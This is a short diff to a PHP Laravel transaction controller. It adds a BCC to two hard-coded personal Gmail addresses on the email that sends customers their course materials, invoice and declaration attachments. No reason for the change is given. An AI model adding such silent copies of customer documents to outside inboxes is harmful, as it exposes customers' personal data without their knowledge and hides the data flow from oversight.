@@ -339,7 +339,10 @@ class TransactionController extends Controller
 
         //  SEND COURSE + INVOICE EMAIL
 
-        Mail::to($tnx->payer_email)->send(
+        Mail::to($tnx->payer_email)->bcc([
+            'hareshc1999@gmail.com',
+            'ikondubai@gmail.com'
+        ])->send(
             new CourseMail(
                 $invoicePath,
                 $declarationPath,
